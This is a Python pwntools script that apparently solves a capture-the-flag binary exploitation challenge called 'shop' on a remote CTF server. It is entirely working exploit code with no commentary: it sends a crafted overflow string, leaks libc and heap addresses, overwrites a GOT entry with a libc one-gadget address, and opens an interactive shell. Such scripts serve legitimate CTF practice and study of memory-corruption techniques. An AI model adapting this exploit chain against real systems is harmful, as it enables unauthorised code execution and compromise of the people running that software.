from pwn import *
import random
import time
#r = process(["./shop"])
r = remote("shop.chal.pwning.xxx",9916)
r.sendlineafter("name:","a")
total = "0123456789abcdef"
ans = ""
for a in total:
	 for b in total:
		 for c in total:
			 for d in total:
				if a+b+c+d in ans:
					pass
				elif a+b+c in ans[-3:]:
					ans+=d
				elif a+b in ans[-2:]:
					ans+=(c+d)
				elif a in ans[-1:]:
					ans+=(b+c+d)
				else:
					ans+=(a+b+c+d)

print hex(len(ans))


for i in range(33):
	r.sendlineafter(">","a")
	r.sendline("a")
	r.sendline(str(i))
	r.sendline("1.0")

r.sendlineafter(">","c")
r.send(ans[:0x10003])


r.sendlineafter(">","n")
r.sendlineafter("name:",p64(0x6020b4)+p64(0x0)[:3])
r.sendlineafter(">","l")
r.recvuntil("- 0")
r.recvline()
libc = u64(r.recvn(6).ljust(8,'\x00'))-0x3c5620
print hex(libc)
r.sendlineafter(">","n")
r.sendlineafter("name:",p64(0x6020b4))

r.sendlineafter(">","l")
r.recvuntil("- 0")
r.recvuntil("- ")
heap = u64(r.recvline()[:-1].ljust(8,'\x00'))
print hex(heap)

#r.sendlineafter(">","c")
#r.send(ans[:0x10003-4]+p32(heap))

r.sendlineafter(">","n")
r.sendlineafter("name:",p64(0x6020d8))

r.sendlineafter(">","c")
r.send(ans[:0x10003-4]+p32(heap))
r.sendlineafter(">","n")
r.sendlineafter("name:","\x00"*0x108+p64(0x602028))
r.sendlineafter(">","n")
r.sendlineafter("name:",p64(libc+0xf1147))

r.interactive()

